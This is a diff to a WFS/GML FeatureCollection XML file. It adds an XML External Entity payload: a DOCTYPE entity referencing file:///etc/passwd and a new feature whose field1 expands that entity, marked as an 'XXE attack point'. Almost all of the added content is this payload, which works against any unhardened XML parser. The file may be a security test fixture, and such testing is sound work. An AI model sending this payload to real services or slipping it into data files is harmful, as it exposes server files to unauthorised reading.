@@ -1,4 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE FeatureCollection [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
 <FeatureCollection xmlns="http://www.opengis.net/wfs"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://www.opengis.net/wfs http://schemas.opengis.net/wfs/2.0/wfs.xsd">
@@ -7,7 +10,6 @@
             <field1>value1</field1>
             <field2>value2</field2>
             <geometry>
-                <!-- Geometry can be defined here, e.g., Point, LineString, Polygon -->
                 <gml:Point xmlns:gml="http://www.opengis.net/gml">
                     <gml:coordinates>10,20</gml:coordinates>
                 </gml:Point>
@@ -21,6 +23,18 @@
             <geometry>
                 <gml:Point xmlns:gml="http://www.opengis.net/gml">
                     <gml:coordinates>15,25</gml:coordinates>
+                </gml:Point>
+            </geometry>
+        </Feature>
+    </Member>
+    <!-- XXE attack point -->
+    <Member>
+        <Feature>
+            <field1>&xxe;</field1>
+            <field2>Injected XXE</field2>
+            <geometry>
+                <gml:Point xmlns:gml="http://www.opengis.net/gml">
+                    <gml:coordinates>20,30</gml:coordinates>
                 </gml:Point>
             </geometry>
         </Feature>
